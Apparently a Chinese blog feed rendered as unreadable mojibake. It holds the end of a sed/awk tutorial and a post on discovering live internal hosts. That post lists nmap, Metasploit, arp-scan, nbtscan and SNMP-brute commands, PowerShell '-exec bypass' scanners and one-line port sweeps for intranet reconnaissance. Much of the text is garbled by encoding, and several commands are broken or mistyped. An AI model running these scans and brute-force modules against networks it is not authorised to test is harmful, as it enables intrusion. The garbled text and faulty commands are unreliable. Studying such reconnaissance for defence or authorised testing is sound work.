å¤„ç†åˆ°ç¬¬ä¸€è¡Œæ—¶å€™ï¼Œæš‚å­˜;åˆ°ç¬¬äºŒè¡Œå’Œæœ€åä¸€è¡Œï¼Œå–è¿‡æ¥ æ¨¡å¼ç©ºé—´/æš‚å­˜ç©ºé—´ ## å°å†™æ˜¯è¦†ç›–ï¼Œå¤§å†™æ˜¯è¿½åŠ  æ¨¡å¼ç©ºé—´ h H --> æš‚å­˜ç©ºé—´ æ¨¡å¼ç©ºé—´ &lt;--- g G æš‚å­˜ç©ºé—´ sed -r 'G;G' /etc/hosts # æ‰€æœ‰è¡Œ sed -r 'g;g' /etc/hosts # æš‚å­˜ç©ºé—´ä¸ªæ¨¡å¼ç©ºé—´äº’ç›¸è½¬æ¢å‘½ä»¤ x sed -r '4h; 5x; 6G' /etc/hosts # å¤„ç†åˆ°ç¬¬å››è¡Œè¦†ç›–åˆ°æš‚å­˜ç©ºé—´ï¼Œåˆ°ç¬¬äº”è¡Œ:ã€‚ã€‚ã€‚ åå‘é€‰æ‹© sed -r '3d' /etc/hosts sed -r '3!d' /etc/hosts å¤šé‡ç¼–è¾‘é€‰é¡¹ # -e sed -r -e '1,3d' -e 's/java/python/' datafile # ç¬¬ä¸€è¡Œåˆ°ç¬¬ä¸‰è¡Œåˆ é™¤ï¼Œåé¢çš„æ›¿æ¢è¦†ç›– sed -r '2{s/java/python/g; s/php/go/g}' datafile # ä¸€è¡Œé‡Œé¢æ›¿æ¢ä¸¤æ¬¡ å¸¸è§æ“ä½œ ############ å¸¸è§æ“ä½œ # åˆ é™¤#æ³¨é‡Šè¡Œ sed -ri '/^#/d' file.conf # è¿™ç§æƒ…å†µå¿…é¡»æ˜¯ç¬¬ä¸€ä¸ªå°±æ˜¯æ³¨é‡Šç¬¦ sed -ri '/^[\t]*#/d' file.conf # å¦‚æœæ˜¯å‰é¢æœ‰ç©ºæ ¼æˆ–tabç„¶åæ‰æ˜¯æ³¨é‡Šç¬¦ # åˆ é™¤//æ³¨é‡Šè¡Œ sed -ri '\Y/^[\t]*//Yd' file.conf # åˆ é™¤æ— å†…å®¹ç©ºè¡Œ sed -ri '/^[\t]*$/d' file.conf # åˆ é™¤æ³¨é‡Šè¡ŒåŠç©ºè¡Œ sed -ri '/^[\t]*#|^[\t]*$/d' file.conf sed -ri '/^[\t]*(#|$)/d' file.conf # #åŠ æ³¨é‡Šï¼ˆvimæ˜¯ä¸€æ ·æ˜¯ï¼‰ :%s/.*/#&amp;/g åœ¨æ‰€æœ‰è¡Œå‰é¢åŠ æ³¨é‡Š :3,5s/^/#&amp;/ å’Œsedæ˜¯ä¸€æ ·çš„ sed -r '1,5s/^/#/' c.txt sed -r '3,$ s/^#*/#/' c.txt # å°†è¡Œé¦–0åˆ°å¤šä¸ªäº•æ¢æˆä¸€ä¸ªäº• # å¦‚æœäº•å‰æœ‰ç©ºæ ¼æˆ–tabç­‰ sed -r '3,$ s/^[\t]*#*/#/' c.txt # sedä½¿ç”¨å¤–éƒ¨å˜é‡(ä½¿ç”¨åŒå¼•å·) var1=111 sed -ri "3a$val1" /etd/hosts sed -ri '$a'"$val1" /etd/hosts # ç¬¬ä¸€ä¸ªå•å¼•å·æ˜¯`æœ€åä¸€è¡Œ`ï¼Œç¬¬äºŒä¸ªé‡Œé¢æ˜¯å˜é‡ sed -ri "\$a$val1" /etd/hosts # æŠŠ$aè½¬ä¹‰ä¸€ä¸‹ä¹Ÿè¡Œ cat a.txt tac a.txt # ä»åå¾€å‰å€’åºï¼ˆ sed -r '1!G; $!d' a.txt æ¨å¯¼ä¸€ä¸‹å¼„æ˜ç™½ ï¼‰ ä¹.awk awkæœ¬èº«ä¹Ÿæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼ˆps:æˆ‘ä»¬ä½¿ç”¨çš„ä¸æ˜¯çº¯ç²¹çš„awkï¼Œè€Œæ˜¯gawkï¼‰ sedæ˜¯ä¿®æ”¹æ–‡ä»¶ awkæ˜¯ç”¨æ¥ç»Ÿè®¡ è¯­æ³•æ ¼å¼ awk [options] 'cmd' filenames options é€‰é¡¹ -F æŒ‡å®šåˆ†éš”ç¬¦ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼æˆ–tab command # BEGIN{} è¡Œå¤„ç†å‰ # {} è¡Œå¤„ç†ï¼ˆæœ‰å‡ è¡Œå°±å¤„ç†å‡ æ¬¡ï¼‰ # END è¡Œå¤„ç†å awk 'BEGIN{print 1/2} {print "ok"}END{print "------"}' /etc/hosts # BEGIN{} é€šå¸¸ç”¨äºå®šä¹‰ä¸€äº›å˜é‡ï¼Œæ¯”å¦‚: BEGIN{FS=":";OFS="---"} # OFS è¾“å‡ºæ—¶å€™çš„å­—æ®µåˆ†éš”ç¬¦ awk 'BEGIN{FS=":"} {print $1}' passwd # åœ¨å¤„ç†ä¹‹å‰ï¼Œ(FS)å°±æŒ‡å®šäº†åˆ†éš”ç¬¦ awkå‘½ä»¤æ ¼å¼ # awk 'pattern' filename awk '/root/' /etc/passwd # awk '{action}' filename awk -F: '{print $3}' /etc/passwd # awk 'pattern {action}' filename awk -F":" '/root/{print $3}' /etc/passwd awk 'BEGIN{FS=":"} /root/{print $3}' /etc/passwd # command |awk 'pattern {action}' df -P |grep '/' |awk '$4'>25000 {print $4} # é™¤å»ç¬¬ä¸€è¡Œï¼Œå¦‚æœå¤§äº25000å°±æ‰“å°ç¬¬å››åˆ— awkå·¥ä½œåŸç† è®°å½•ä¸å­—æ®µç›¸å…³çš„å†…éƒ¨å˜é‡ ## å¯ä»¥é€šè¿‡ man awk æŸ¥çœ‹ # $0 awkå˜é‡ä¿å­˜å½“å‰è®°å½•çš„å†…å®¹ awk -F":" '{print $0}' /etc/passwd # NR è¾“å…¥è®°å½•æ€»çš„ç¼–å·ï¼Œæ˜¾ç¤ºè¡Œå· awk -F":" '{print NR,$0}' /etc/passwd # FNR å½“å‰è®°å½•æ–‡ä»¶çš„ç¼–å·(å¤„ç†å¤šä¸ªæ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶é‡æ–°å¼€å§‹ç¼–å·) awk -F":" '{print FNR,$0}' /etc/passwd /etc/passwd # NF: ä¿å­˜è®°å½•çš„å­—æ®µæ•°(è¿™ä¸€è¡Œä¸€å…±æœ‰å¤šå°‘å­—æ®µ), $NFä»£è¡¨æœ€åä¸€ä¸ªå­—æ®µ awk -F":" '{print $0,NF,$NF}' /etc/passwd # FS è¾“å…¥å­—æ®µåˆ†éš”ç¬¦ï¼Œé»˜è®¤ç©ºæ ¼æˆ–tab awk 'BEGIN{FS=":"} {print $0}' /etc/passwd awk -F'[:\t]' '{print $0,NF,$NF}' /etc/passwd # OFS è¾“å…¥å­—æ®µåˆ†éš”ç¬¦ï¼Œé»˜è®¤ç©ºæ ¼, OFS:è¾“å‡ºåˆ†éš”ç¬¦ awk 'BEGIN{FS=":";OFS="+++"} {print $0}' /etc/passwd # RS --è®°å½•åˆ†éš”ç¬¦(åŒºåˆ†ä¸FSå­—æ®µåˆ†éš”ç¬¦) é»˜è®¤æ¢è¡Œç¬¦ awk 'BEGIN{RS=":"} {print $0}' /etc/passwd # ORS awk 'BEGIN{ORS=":"} {print $0}' /etc/passwd # å°†æ–‡ä»¶æ¯ä¸€è¡Œåˆå¹¶ä¸ºä¸€è¡Œï¼ˆORS è¾“å‡ºè®°å½•åˆ†éš”ç¬¦ï¼‰ awk 'BEGIN{ORS=""} {print $0}' /etc/passwd æ ¼å¼åŒ–è¾“å‡º # 1.print # 2.printf å¯ä»¥æ ¼å¼åŒ–ï¼ˆé»˜è®¤æ²¡æœ‰æ¢è¡Œï¼Œæ‰‹åŠ¨åŠ \nï¼‰ date |awk '{print "Month:" $2"\nYear: " $NF}' # åªè¦ä¸æ˜¯å˜é‡ï¼Œå°±è¦æ”¾åˆ°åŒå¼•å·é‡Œé¢ # %s å­—ç¬¦ä¸²ï¼ˆ-15s 15ä¸ªå­—ç¬¦ï¼Œå·¦å¯¹é½ï¼‰ %f æµ®ç‚¹å‹ï¼Œ %dæ•°å€¼ç±»å‹ awk -F: '{printf "%-15s %-10s %-15s\n", $1,$2,$3}' /etc/passwd awkæ¨¡å¼å’ŒåŠ¨ä½œ æ¨¡å¼ï¼šæ¡ä»¶è¯­å¥ï¼Œå¤åˆè¯­å¥ï¼Œæ­£åˆ™è¡¨è¾¾å¼ã€‚ åŒ…æ‹¬ä¸¤ä¸ªç‰¹æ®Šå­—å…¸ï¼šBEGINå’ŒEND ### æ¨¡å¼å¯ä»¥æ˜¯ ======= æ­£åˆ™è¡¨è¾¾å¼ # åŒ¹é…è®°å½•ï¼ˆæ•´è¡Œï¼‰ awk '/^xps/' /etc/passwd # awk '$0 ~ /^xps/' /etc/passwd # ~ åŒ¹é… awk '!/xps/' /etc/passwd # awk '$0 !~ /^xps/' /etc/passwd # åŒ¹é…å­—æ®µï¼šåŒ¹é…æ“ä½œç¬¦(~!~) awk -F: '$1 ~ /^xps/' /etc/passwd # awk -F: '$NF !~ /^bash$/' /etc/passwd # æœ€åä¸€åˆ—ä¸æ˜¯ä»¥bashç»“å°¾çš„ ======= æ¯”è¾ƒè¡¨è¾¾å¼ # ç”¨äºæ¯”è¾ƒ æ•°å­— ä¸ å­—ç¬¦ä¸² # > &lt; == awk -F: '$3 == 0' /etc/passwd awk -F: '$3 == "/xps/"' /etc/passwd # == å…¨éƒ¨ç­‰äº awk -F: '$3 ~ /xps/' /etc/passwd # æ­£åˆ™åŒ¹é… awk -F: '$NF ~ /xps/' /etc/passwd ======= æ¡ä»¶è¡¨è¾¾å¼ awk -F: '$3>200{print $0}' /etc/passwd # $3å¤§äº200çš„ï¼Œ$0 awk -F: '{ if($3>200) {print $0} }' /etc/passwd # æ¨èè¿™ä¹ˆå†™ { if(){cmd1;cmd2} else{} } awk -F: '{ if($3>200) {print $0} else{print $1} }' /etc/passwd ======= ç®—æ•°è¿ç®— #awkéƒ½æŒ‰æµ®ç‚¹æ•°æ–¹å¼æ‰§è¡Œç®—æ•°è¿ç®— awk -F: '$3 * 10 > 500' /etc/passwd awk -F: '{ if($3*10>500){print $0} }' /etc/passwd # å¦‚æœ$3*10>500ï¼Œå°±... ======= é€»è¾‘æ“ä½œç¬¦å’Œå¤åˆæ¨¡å¼ &amp;&amp; é€»è¾‘ä¸ || é€»è¾‘æˆ– ï¼ é€»è¾‘é awk -F: '$1~/root/ &amp;&amp; $3&lt;=15' /etc/passwd awk -F: '$1~/root/ || $3&lt;=15' /etc/passwd awk -F: '!($1~/root/ &amp;&amp; $3&lt;=15)' /etc/passwd ======= èŒƒå›´æ¨¡å¼ awk '/Tom,/Susan/' filename awkè„šæœ¬ç¼–ç¨‹ ### awkè„šæœ¬ç¼–ç¨‹ ====== æ¡ä»¶ç¼–ç¨‹ awk -F":" '{if(){} else if(){} else{}}' passwd awk -F":" '{if($3>0 &amp;&amp; $3&lt;1000){count++}} END{print count}' /etc/passwd # ç»Ÿè®¡ç³»ç»Ÿç”¨æˆ·æ•° awk -F":" '{if($3==0){count++}} else{i++} END{print "ç®¡ç†å‘˜ä¸ªæ•°ï¼š"count; print "ç³»ç»Ÿç”¨æˆ·ä¸ªæ•°:"i}' /etc/passwd awk -F":" '{if($3==0){i++}} else if($3&lt;999){j++} else{k++} END{print "ç®¡ç†å‘˜ä¸ªæ•°ï¼š"i; print "æ™®é€šç”¨æˆ·ä¸ªæ•°:"j; print "ç³»ç»Ÿç”¨æˆ·ä¸ªæ•°:"k}' /etc/passwd ====== å¾ªç¯ # 1.while ä¾æ­¤æ‰“å°æ¯ä¸€åˆ— awk -F":" '{i=1;while(i&lt;7){print $i;i++}}' /etc/passwd awk -F":" '/^root/{i=1;while(i&lt;7){print $i;i++}}' /etc/passwd awk -F":" '{i=1;while(i&lt;=NF){print $i;i++}}' /etc/passwd awk '{i=1;while(i&lt;=NF){print $i;i++}}' a.txt # æ‰“å°æ–‡ä»¶æ‰€æœ‰å†…å®¹(é»˜è®¤æ˜¯ç©ºæ ¼å’Œtabåˆ†å‰²) # 2.for awk 'BEGIN{for(i=1;i&lt;=5;i++){prin i}}' # cé£æ ¼çš„ awk -F: '{for(i=1;i&lt;=NF;i++){prin $i}}' passwd awk -F: '{for(i=1;i&lt;=NF;i++){prin $0}}' passwd # å°†æ¯è¡Œæ‰“å°10æ¬¡ ====== æ•°ç»„ (ç”¨æ¥ç»Ÿè®¡) awk -F: '{username[++i]=$1} END{print username[1]}' /etc/passwd awk -F: '{username[i++]=$1} END{print username[1]}' /etc/passwd awk -F: '{username[i++]=$1} END{print username[0]}' /etc/passwd ## æ•°ç»„éå†(ä¸»è¦ç”¨æŒ‰ç´¢å¼•éå†) # usernameæ•°ç»„åï¼Œ å…ˆä¿å­˜åˆ°æ•°ç»„ä¸­ï¼Œå†è¿›è¡Œéå† awk -F: '{username[i++]=$1} END{for(i in username) {print i,username[i]}}' /etc/passwd awk -F: '{username[++i]=$1} END{for(i in username) {print i,username[i]}}' /etc/passwd åŸºæœ¬ç»ƒä¹  ###### åŸºæœ¬ç»ƒä¹  ### 1. ç»Ÿè®¡/etc/passwd ä¸­å„ç§shellçš„æ•°é‡ # # æŠŠè¦ç»Ÿè®¡çš„å¯¹è±¡ä½œä¸ºæ•°ç»„çš„ç´¢å¼•(è¿™é‡Œæ˜¯æœ€åä¸€ä¸ª$NF,ä¹Ÿå°±æ˜¯shellçš„ç±»å‹) awk -F: '{shells[$NF]++} END{for(i in shells){print i,shells[i]}}' /etc/passwd ### 2.ç½‘ç«™è®¿é—®çŠ¶æ€ç»Ÿè®¡ netstat -ant |grep :80 |awk '{access_stat[$NF]++} END{for(i in access_stat){print i,access_stat[i]}}' netstat -ant |grep :80 |awk '{access_stat[$NF]++} END{for(i in access_stat){print i,access_stat[i]}}' |sort -k2 -n |head ss -ant |grep :80 |awk '{access_stat[$2]++} END{for(i in access_stat){print i,access_stat[i]}}' ### 3.ç»Ÿè®¡å½“å‰è®¿é—®çš„æ¯ä¸ªIPçš„æ•°é‡ &lt;å½“å‰å®æ—¶çŠ¶æ€ netstat, ss> netstat -ant |grep :80 |awk -F: '{ip_count[$8]++} END{for(i in ip_count){print i,ip_count[i]}}' # ä¸‹é¢è¿™ä¸ªæœ‰ç‚¹å¤æ‚äº†ï¼Œä¸æ¨èç”¨ ss -ant |grep :80 |awk -F: '!/LISTEN/{ip_count[$(NF-1)]++} END{for(i in ip_count){print i,ip_count[i]}}' |sort 0k2 -rn |head 5 ### 4.ç»Ÿè®¡Apache/Nginxæ—¥å¿—ä¸­æŸä¸€å¤©çš„PVé‡ &lt;ç»Ÿè®¡æ—¥å¿—> grep '07/Aug/2019' access.log |wc -l # wc -l ç»Ÿè®¡è¡Œæ•° ### 4.ç»Ÿè®¡Apache/Nginxæ—¥å¿—ä¸­æŸä¸€å¤©ä¸é€šIPçš„PVé‡ &lt;ç»Ÿè®¡æ—¥å¿—> grep '07/Aug/2019' access.log |awk '{ips[$1]++} END{for(i in ips){print i, ips[i]}}' |sort -k2 -rn | head awk '/22/\Mar\/2019/{ips[$1]++} END{for(i in ips){print i, ips[i]}}' # >100çš„æ‰æ‰“å°ï¼ˆæ­¤æ–¹æ³•æœ‰ç‚¹lowï¼Œå¯ç”¨ä¸‹é¢çš„å‡ ç§æ–¹æ³•ï¼‰ awk '/22/\Mar\/2019/{ips[$1]++} END{for(i in ips){print i, ips[i]}}' | awk '$2>100' |sort -k2 -rn | head awk '/22/\Mar\/2019/{ips[$1]++} END{for(i in ips){if(ips[i]>100){print i, ips[i]}}}' | # >100çš„æ‰æ‰“å° awk '$2>100' |sort -k2 -rn | head #ã€æ€è·¯ã€‘ å°†è¦ç»Ÿè®¡çš„å­—æ®µä½œä¸ºæ•°ç»„çš„ç´¢å¼• ### awkå‡½æ•° # ç»Ÿè®¡ç”¨æˆ·åä¸º4ä¸ªå­—ç¬¦çš„ç”¨æˆ· awk -F: '$1~/^....$/{count++;print $1} END{print "count is:" count}' /etc/passwd # length awk -F: 'length($1)==4{count++;print $1} END{print "count is:" count}' /etc/passwd ### awkè‡ªå®šä¹‰å˜é‡(å¤–éƒ¨å˜é‡) # 1.å†åŒå¼•å·é‡Œé¢ var=bash echo "unix script" |awk "gsub(/unix/, \"$var\")" # è½¬ä¹‰åŒå¼•å·ï¼Œé‡Œé¢æ˜¯$å˜é‡ # 2.ä¸¤ä¸ªåŒå¼•å·é‡Œé¢å¥—ä¸ªå•å¼•å· echo "unix script" |awk 'gsub(/unix/, "'"$var\"'")' # df -h |awk '{ if(int($5)>10){print $6":"$5} }' # å†å‡½æ•°å¤–é¢å•å¼•å·æƒ…å†µä¸‹ i=10 df -h |awk '{ if(int($5)>'''$i'''){print $6":"$5} }' # 3.å»ºè®®ï¼š -v awk -v user=root -F:'$1 == user' /etc/passwd # åœ¨-vçš„æ—¶å€™å®šä¹‰å˜é‡user=root var=bash echo "unix script" |awk "gsub(/unix/, var)" # å‰é¢é€ ä¸€æ¡å‘½ä»¤ï¼Œä¼ ç»™bashæ‰§è¡Œ arp -n |awk '/^[0-9]/{print "arp -d $1"}' |bash å®ä¾‹å®è·µä¸­å†å†™â€¦.. é™„å…¶ä»–å‚è€ƒæ–‡ç« ï¼š https://blog.csdn.net/u011436427/article/details/103815680 https://mp.weixin.qq.com/s/dXLlFgQS_3KHm8YRyDC7ZQ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
  </entry>
  <entry>
    <title><![CDATA[å‘ç°å†…ç½‘å­˜æ´»ä¸»æœºæ–¹æ³•-ç®€å•æ•´ç†]]></title>
    <url>%2Fposts%2F48517%2F</url>
    <content type="text"><![CDATA[åŸºäºUDPå‘ç°å†…ç½‘å­˜æ´»ä¸»æœº UDPæ˜¾è‘—ç‰¹æ€§:1.UDP ç¼ºä¹å¯é æ€§ã€‚UDP æœ¬èº«ä¸æä¾›ç¡®è®¤,è¶…æ—¶é‡ä¼ ç­‰æœºåˆ¶ã€‚UDP æ•°æ®æŠ¥å¯èƒ½åœ¨ç½‘ç»œä¸­è¢«å¤åˆ¶,è¢«é‡æ–°æ’åº,ä¹Ÿä¸ä¿è¯æ¯ä¸ªæ•°æ®æŠ¥åªåˆ°è¾¾ä¸€æ¬¡ã€‚2.UDP æ•°æ®æŠ¥æ˜¯æœ‰é•¿åº¦çš„ã€‚æ¯ä¸ª UDP æ•°æ®æŠ¥éƒ½æœ‰é•¿åº¦,å¦‚æœä¸€ä¸ªæ•°æ®æŠ¥æ­£ç¡®åœ°åˆ°è¾¾ç›®çš„åœ°,é‚£ä¹ˆè¯¥æ•°æ®æŠ¥çš„é•¿åº¦å°†éšæ•°æ®ä¸€èµ·ä¼ é€’ç»™æ¥æ”¶æ–¹ã€‚è€Œ TCP æ˜¯ä¸€ä¸ªå­—èŠ‚æµåè®®,æ²¡æœ‰ä»»ä½•(åè®®ä¸Šçš„)è®°å½•è¾¹ç•Œã€‚3.UDP æ˜¯æ— è¿æ¥çš„ã€‚UDP å®¢æˆ·å’ŒæœåŠ¡å™¨ä¹‹å‰ä¸å¿…å­˜åœ¨é•¿æœŸçš„å…³ç³»ã€‚å¤§å¤šæ•°çš„UDPå®ç°ä¸­éƒ½é€‰æ‹©å¿½ç•¥æºç«™æŠ‘åˆ¶å·®é”™,åœ¨ç½‘ç»œæ‹¥å¡æ—¶,ç›®çš„ç«¯æ— æ³•æ¥æ”¶åˆ°å¤§é‡çš„UDPæ•°æ®æŠ¥4.UDP æ”¯æŒå¤šæ’­å’Œå¹¿æ’­ã€‚ 1.nmapæ‰«æ# -sU nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500 2.msfæ‰«æuse auxiliary/scanner/discovery/udp_probe # æˆ–è¿™ä¸ªæ¨¡å— use auxiliary/scanner/discovery/udp_sweep 3.unicornscanæ‰«æLinuxä¸‹æ¨è unicornscan -mU 192.168.1.100 4.ScanLineæ‰«æMcAfeeå‡ºå“,winä¸‹ä½¿ç”¨æ¨èã€‚ç®¡ç†å‘˜æ‰§è¡Œã€‚é¡¹ç›®åœ°å€:https://www.mcafee.com/ca/downloads/free-tools/scanline.aspxç½‘ç›˜åœ°å€:http://pan.baidu.com/s/1i4A1wLR å¯†ç :hvyxè‡ªå·±æœç´¢èµ„æºå§ è¾“å…¥slè¿è¡ŒScanLine 5.åœ¨çº¿åŸºäºNmapçš„udpæ‰«æ:ç‚¹å‡»é“¾æ¥ åŸºäºARPå‘ç°å†…ç½‘å­˜æ´»ä¸»æœº1.nmapæ‰«ænmap -sn -PR 192.168.1.1/24 2.msfæ‰«æuse auxiliary/scanner/discovery/arp_sweep ... 3.netdiscovernetdiscover -r 192.168.1.0/24 -i wlan0 4.arp-scan(linux)(æ¨è)é€Ÿåº¦ä¸å¿«æ·é¡¹ç›®åœ°å€:https://linux.die.net/man/1/arp-scanarp-scanæ²¡æœ‰å†…ç½®kali,éœ€è¦ä¸‹è½½å®‰è£…ã€‚ apt-get install arp-scan arp-scan --interface=wlan0 --localnet 5.Powershellpowershell.exe -exec bypass -Command "Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24" 6.arp scanneté¡¹ç›®åœ°å€: https://sourceforge.net/projects/arpscannet/files/arpscannet/arpscannet%200.4/ 7.arp-scan(windows)(æ¨è)é€Ÿåº¦ä¸å¿«æ·é¡¹ç›®åœ°å€:https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan(éå®˜æ–¹) arp-scan.exe -t 192.168.1.1/24 8.arp-ping.exearp-ping.exe 192.168.1.100 9.å…¶ä»–å¦‚cainçš„arpå‘ç°,ä¸€äº›å¼€æºpy,plè„šæœ¬ç­‰,ä¸ä¸€ ä¸€ä»‹ç»ã€‚ ä¸‹è½½çš„å·¥å…·ï¼Œåé—¨è‡ªæŸ¥ åŸºäºnetbioså‘ç°å†…ç½‘å­˜æ´»ä¸»æœºIBMå…¬å¸å¼€å‘,ä¸»è¦ç”¨äºæ•°åå°è®¡ç®—æœºçš„å°å‹å±€åŸŸç½‘ã€‚è¯¥åè®®æ˜¯ä¸€ç§åœ¨å±€åŸŸç½‘ä¸Šçš„ç¨‹åºå¯ä»¥ä½¿ç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£(API),ä¸ºç¨‹åºæä¾›äº†è¯·æ±‚ä½çº§æœåŠ¡çš„åŒä¸€çš„å‘½ä»¤é›†,ä½œç”¨æ˜¯ä¸ºäº†ç»™å±€åŸŸç½‘æä¾›ç½‘ç»œä»¥åŠå…¶ä»–ç‰¹æ®ŠåŠŸèƒ½ã€‚ç³»ç»Ÿå¯ä»¥åˆ©ç”¨WINSæœåŠ¡ã€å¹¿æ’­åŠLmhostæ–‡ä»¶ç­‰å¤šç§æ¨¡å¼å°†NetBIOSå-â€”â€”ç‰¹æŒ‡åŸºäºNETBIOSåè®®è·å¾—è®¡ç®—æœºåç§°â€”â€”è§£æä¸ºç›¸åº”IPåœ°å€,å®ç°ä¿¡æ¯é€šè®¯,æ‰€ä»¥åœ¨å±€åŸŸç½‘å†…éƒ¨ä½¿ç”¨NetBIOSåè®®å¯ä»¥æ–¹ä¾¿åœ°å®ç°æ¶ˆæ¯é€šä¿¡åŠèµ„æºçš„å…±äº«ã€‚ 1.nmapæ‰«æ# nbstat.nse nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4 2.msfæ‰«æuse auxiliary/scanner/netbios/nbname 3.nbtscanæ‰«æé¡¹ç›®åœ°å€: http://www.unixwiz.net/tools/nbtscan.htmlNBTscan version 1.5.1: https://github.com/scallywag/nbtscan ### Windows nbtscan-1.0.35.exe -m 192.168.1.0/24 nbtscan -n # æ¨è ### Linux ï¼ˆæ¨èï¼‰ tar -zxvf ./nbtscan-source-1.0.35.tgz # (å…¶ä»–ç‰ˆæœ¬è‡ªå·±å¯»æ‰¾) make nbtscan -r 192.168.1.0/24 nbtscan -v -s: 192.168.1.0/24 4.NetBScanner:é¡¹ç›®åœ°å€:https://www.nirsoft.net/utils/netbios_scanner.html åŸºäºsnmpå‘ç°å†…ç½‘å­˜æ´»ä¸»æœºSNMPåè®®ä¸»è¦ç”±ä¸¤å¤§éƒ¨åˆ†æ„æˆ: SNMPç®¡ç†ç«™å’ŒSNMPä»£ç†ã€‚SNMPç®¡ç†ç«™æ˜¯ä¸€ä¸ªä¸­å¿ƒèŠ‚ç‚¹,è´Ÿè´£æ”¶é›†ç»´æŠ¤å„ä¸ªSNMPå…ƒç´ çš„ä¿¡æ¯,å¹¶å¯¹è¿™äº›ä¿¡æ¯è¿›è¡Œå¤„ç†,æœ€ååé¦ˆç»™ç½‘ç»œç®¡ç†å‘˜;è€ŒSNMPä»£ç†æ˜¯è¿è¡Œåœ¨å„ä¸ªè¢«ç®¡ç†çš„ç½‘ç»œèŠ‚ç‚¹ä¹‹ä¸Š,è´Ÿè´£ç»Ÿè®¡è¯¥èŠ‚ç‚¹çš„å„é¡¹ä¿¡æ¯,å¹¶ä¸”è´Ÿè´£ä¸SNMPç®¡ç†ç«™äº¤äº’,æ¥æ”¶å¹¶æ‰§è¡Œç®¡ç†ç«™çš„å‘½ä»¤,ä¸Šä¼ å„ç§æœ¬åœ°çš„ç½‘ç»œä¿¡æ¯ 1.nmapæ‰«ænmap -sU --script snmp-brute 192.168.1.0/24 -T4 2.msfæ‰«æuse auxiliary/scanner/snmp/snmp_enum 3.SMBScané¡¹ç›®åœ°å€:https://www.mcafee.com/us/downloads/free-tools/snscan.aspxä¾ç„¶æ˜¯ä¸€å—macafeeå‡ºå“çš„æ”»å‡» 4.NetCrunché¡¹ç›®åœ°å€:https://www.adremsoft.com/demo/å†…ç½‘å®‰å…¨å®¡è®¡å·¥å…·,åŒ…å«äº†DNSå®¡è®¡,pingæ‰«æ,ç«¯å£,ç½‘ç»œæœåŠ¡ç­‰ã€‚ 5.snmp for plæ‰«æ:é¡¹ç›®åœ°å€:https://github.com/dheiland-r7/snmp å…¶ä»–æ‰«æ:6.snmpbulkwalk 7.snmp-check 8.snmptest é™„å½• use auxiliary/scanner/snmp/aix_version use auxiliary/scanner/snmp/snmp_enumuse auxiliary/scanner/snmp/arris_dg950 use auxiliary/scanner/snmp/snmp_enum_hp_laserjet use auxiliary/scanner/snmp/brocade_enumhash use auxiliary/scanner/snmp/snmp_enumshares use auxiliary/scanner/snmp/cambium_snmp_loot use auxiliary/scanner/snmp/snmp_enumusers use auxiliary/scanner/snmp/cisco_config_tftp use auxiliary/scanner/snmp/snmp_login use auxiliary/scanner/snmp/cisco_upload_file use auxiliary/scanner/snmp/snmp_set use auxiliary/scanner/snmp/netopia_enum use auxiliary/scanner/snmp/ubee_ddw3611 use auxiliary/scanner/snmp/sbg6580_enum use auxiliary/scanner/snmp/xerox_workcentre_enumusers å…¶ä»–å†…ç½‘å®‰å…¨å®¡è®¡å·¥å…·(snmp):é¡¹ç›®åœ°å€: https://www.solarwinds.com/topics/snmp-scanneré¡¹ç›®åœ°å€: https://www.netscantools.com/nstpro_snmp.html snmp for pl : wget http://www.cpan.org/modules/by-module/NetAddr/NetAddr-IP-4.078.tar.gz tar xvzf ./NetAddr-IP-4.078.tar.gz cd NetAddr-IP-4.078/ perl Makefile.PL make make install ./snmpbw.pl åŸºäºICMPå‘ç°å†…ç½‘å­˜æ´»ä¸»æœº 1.nmapæ‰«ænmap â€sP â€PI 192.168.1.0/24 â€T4 nmap â€sn â€PE â€T4 192.168.1.0/24 2.CMDä¸‹æ‰«æfor /L %P in (1,1,254) DO @ping â€w 1 â€n 1 192.168.1.%P | findstr "TTL=" 3.powershellæ‰«æ# powershellè„šæœ¬ ./Invokeâ€TSPingSweep.ps1 powershell.exe â€exec bypass â€Command "Importâ€Module ./Invokeâ€TSPingSwe ep.ps1; Invokeâ€TSPingSweep â€StartAddress 192.168.1.1 â€EndAddress 192.168.1.2 54 â€ResolveHost â€ScanPort â€Port 445,135" # æˆ– tcping.exe â€n 1 192.168.1.0 80 åŸºäºSMBå‘ç°å†…ç½‘å­˜æ´»ä¸»æœº1.åŸºäºmsf# æ¨¡å— scanner/smb/smb_version 2.åŸºäºcme(å‚è€ƒç¬¬ä¹åä¸‰è¯¾)cme smb 192.168.1.0/24 3.åŸºäºnmapnmap â€sU â€sS â€â€script smbâ€enumâ€shares.nse â€p 445 192.168.119 4.åŸºäºCMDfor /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445 5.åŸºäºpowershell## ä¸€å¥è¯æ‰«æ: #å•IP: 445 | %{ echo ((newâ€object Net.Sockets.TcpClient).Connect("192.168.1.119",$_)) "$_ is open"} 2>$null #å¤šip: 1..5 | % { $a = $_; 445 | % {echo ((newâ€objectNet.Sockets.TcpClient).Connect("192.168.1.$a",$_)) "Port $_ is open"}2>$null} #å¤šport,å¤šIP: 118..119 | % { $a = $_; writeâ€host "â€â€â€â€â€â€"; writeâ€host "192.168.1.$a"; 80,445 | % {echo ((newâ€object Net.Sockets.TcpClient).Connect("192.168.1.$a",$_)) "Port $_ is open"} 2>$null} åŸºäºMSFå‘ç°å†…ç½‘å­˜æ´»ä¸»æœº ä¸€searchæœç´¢ search scanner type:auxiliary ä¸»è¦ä»‹ç»scannerä¸‹çš„äº”ä¸ªæ¨¡å—,è¾…åŠ©å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº,åˆ†åˆ«ä¸º: auxiliary/scanner/discovery/arp_sweep # 